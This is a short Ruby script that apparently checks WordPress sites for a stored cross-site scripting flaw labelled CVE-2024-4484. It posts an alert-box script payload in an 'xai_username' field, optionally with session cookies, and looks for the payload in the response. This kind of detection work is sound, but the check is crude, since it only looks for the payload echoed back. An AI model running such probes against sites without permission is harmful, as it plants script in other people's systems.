require 'httparty'

def detect_vulnerability(url, cookies = nil)
  param = "xai_username"
  payload = "<script>alert('XSS')</script>"
  
  options = {
    body: { param => payload },
    headers: {}
  }

  options[:headers]['Cookie'] = cookies if cookies

  response = HTTParty.post(url, options)

  if response.headers['content-type'].include?('text/html') && response.body.include?(payload)
    puts "Vulnerability detected: #{url} is vulnerable to Stored Cross-Site Scripting (CVE-2024-4484)"
  else
    puts "Vulnerability not detected: #{url} is not vulnerable to Stored Cross-Site Scripting (CVE-2024-4484)"
  end
end

# Get the URL from the user
puts "Enter the URL of the WordPress site:"
url = gets.chomp
cookies = "your_cookie_here" # Replace with the user's cookies if authentication is required

detect_vulnerability(url, cookies)
